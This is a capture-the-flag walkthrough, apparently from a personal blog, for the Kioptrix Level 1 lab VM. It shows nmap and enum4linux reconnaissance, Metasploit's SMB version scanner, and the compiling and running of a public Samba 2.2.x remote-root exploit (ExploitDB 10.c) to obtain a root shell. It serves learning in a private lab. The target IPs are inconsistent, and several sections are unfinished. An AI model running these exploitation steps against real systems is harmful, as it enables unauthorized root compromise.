---
title: Kioptrix Level 1 Walkthrough
date: 2018-09-24
excerpt: "Write-up of the 1st of 5 Kioptrix CTF VM Challenges"
tags: [ctf, cybersec, kioptrix, nmap, metasploit]
---

Kioptrix consists of five capture-the-flag virtual machine challenges. I intend to write about my methodology of solving each of them in time. This is the first (and easiest). These have been solved many times by people before me, but I feel they represent a good challenge and that documenting my efforts is key to learning.

You can find the VM for download over at [Vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/).

Anyone wishing to run Kioptrix 1 in Virtualbox should consult [this setup guide](https://www.hypn.za.net/blog/2017/07/15/running-kioptrix-level-1-and-others-in-virtualbox/).

## My Setup
Currently, I run Kali in a VM using Virtualbox. I have Kioptrix and any other CTF VMs on a shared NatNetwork with Kali. This way Kali can access the internet and see the VMs. It also keeps everything behind NAT.

**IP Range:** I have my NatNetwork set with a DHCP server with an IP address range of 10.0.2.0/24.
{: .notice}

## VM Discovery
We'll need to get the IP address of the target before we can interact with it. I've used both netdiscover and Nmap's Ping Scan.

```bash
root@kali:~# nmap -sP 10.0.2.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 15:57 EDT
...
MAC Address: 08:00:27:47:14:87 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.8
Host is up (0.00020s latency).
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.18 seconds
```

So, my target is 10.0.2.6.

## Port Scanning
Let's see what's available to us over the network using Nmap.
I like to run the following arguments on local VMs:
* -p- All ports (1-65535)
* -sV Service Scan, taking guesses at what services are running on the target. Invaluable.
* -A  OS Detection. Useful, as some exploits are version-dependent.

```bash
root@kali:~# nmap -p- -sV -T4 -sS 10.0.2.8
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 16:04 EDT
Nmap scan report for 10.0.2.8
Host is up (0.00012s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:76:C1:05 (Oracle VirtualBox virtual NIC)


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.21 seconds
```

Gleaning the important information from that reveals the following:
1. OpenSSH 2.9p2 (protocol 1.99) Server running on port 22.
2. Apache 1.3.20 (Red-Hat/Linux) with mods:
    * mod_ssl 2.8.4
    * OpenSSL 0.9.6b
3. Samba on Port 139
4. rpcbind running a "status" service on port 32768

We'll investigate these in more detail shortly.

## Enumeration 4 Linux
Enum4Linux is another enumeration tool to reveal as much information as possible from a Linux target.

```bash
root@kali~# enum4linux 10.0.2.6
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep 24 20:32:09 2018

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.0.2.6
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

...
 ==================================
|    OS information on 10.0.2.6    |
 ==================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.0.2.6 from smbclient:
[+] Got OS info for 10.0.2.6 from srvinfo:
	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
	platform_id     :	500
	os version      :	4.5
	server type     :	0x9a03
...
 =====================================
|    Share Enumeration on 10.0.2.6    |
 =====================================

	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server)
	ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------
	KIOPTRIX             Samba Server

	Workgroup            Master
	---------            -------
	MYGROUP              KIOPTRIX

...

enum4linux complete on Mon Sep 24 20:32:19 2018
```

Others have had luck with enum4linux identifying the Samba server version against this VM, but I've had no such luck.

## Service Investigation
### OpenSSH
To-Do

### Apache
To-Do

### Samba
If you aren't aware of [Metasploit](https://www.metasploit.com/), it contains many exploits, scanners, and other wonderful tools. We're going to make use of its Samba scanner.

```bash
root@kali~# msfconsole
...
msf > grep smb search scanner
...
auxiliary/admin/smb/check_dir_file               normal  SMB Scanner Check File/Directory Utility
...
auxiliary/scanner/smb/smb_version                normal  SMB Version Detection
```

*Note: I used 'grep smb search scanner' to filter the results of 'search scanner' to only those with 'smb' in them.*

The bottom one is what we want to use, as we want to know the version of the Samba (SMB) server.

```bash
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads
```

The important piece is RHOSTS, our target.

```bash
msf auxiliary(scanner/smb/smb_version) > set RHOSTS 10.0.2.6
RHOSTS => 10.0.2.6
msf auxiliary(scanner/smb/smb_version) > run

[.] 10.0.2.6:139          - Host could not be identified: Unix (Samba 2.2.1a)
[.] Scanned 1 of 1 hosts (100% complete)
[.] Auxiliary module execution completed
```

And there's our target's Samba version: 2.2.1a. Let's search for an exploit, preferably RCE.
```bash
msf auxiliary(scanner/smb/smb_version) > exit
root@kali~# searchsploit samba | grep 2.2 # Searching for Samba exploits, filtering for version 2.2.x
...
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer | exploits/linux/remote/16321.rb
Samba 2.2.8 (Linux x86) - 'trans2open' Remote | exploits/linux_x86/remote/16861.rb
Samba 2.2.x - 'call_trans2open' Remote Buffer | exploits/unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer | exploits/unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer | exploits/unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer | exploits/unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Meta | exploits/linux/remote/9936.rb
Samba 2.2.x - Remote Buffer Overflow          | exploits/linux/remote/7.pl
Samba < 2.2.8 (Linux/BSD) - Remote Code Execu | exploits/multiple/remote/10.c
...
```

The "Remote Code Execution" one sounds good. Let's try it.
For reference, Kali keeps a local copy of ExploitDB in /usr/share/exploitdb.

```bash
root@kali~# cp /usr/share/exploitdb/exploits/multiple/remote/10.c 10.c # grab a copy of the exploit code
root@kali~# gcc 10.c # compile using GCC
root@kali~# ./a.out
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./a.out [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode
```

Let's set our options according. Our target is Linux, the port is 139, host is 10.0.2.6 (in my case).

```bash
root@kali~# ./a.out -b 0 10.0.2.6
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
```

Success! We've got a root shell on the host.

## Finding the flag
To-Do

## Conclusions
Overall, this makes for a good introduction to CTFs and the methodology required to solve them. At the simplest: detect, scan, find an exploit, run. The Apache method is a bit more involved, but it showcases some neat tricks.
